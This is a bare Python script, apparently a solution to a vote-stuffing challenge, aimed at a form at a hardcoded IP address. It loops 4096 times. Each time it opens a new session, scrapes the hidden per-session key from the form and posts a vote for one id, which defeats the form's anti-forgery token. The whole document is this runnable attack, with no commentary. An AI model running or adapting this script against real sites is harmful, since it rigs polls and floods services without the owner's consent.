#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

data_form = {"id": "3819", "holdthedoor": "Submit", "key": ""}

if __name__ == "__main__":
    i = 0
    while (i != 4096):
        new_session = requests.session()
        html = new_session.get("http://158.69.76.135/level1.php")
        token = BeautifulSoup(html.text, "html.parser")

        hidden_key = token.find("form", {"method": "post"})
        hidden_key = hidden_key.find("input", {"type": "hidden"})
        data_form["key"] = hidden_key["value"]

        new_session.post("http://158.69.76.135/level1.php", data=data_form)
        i = i + 1
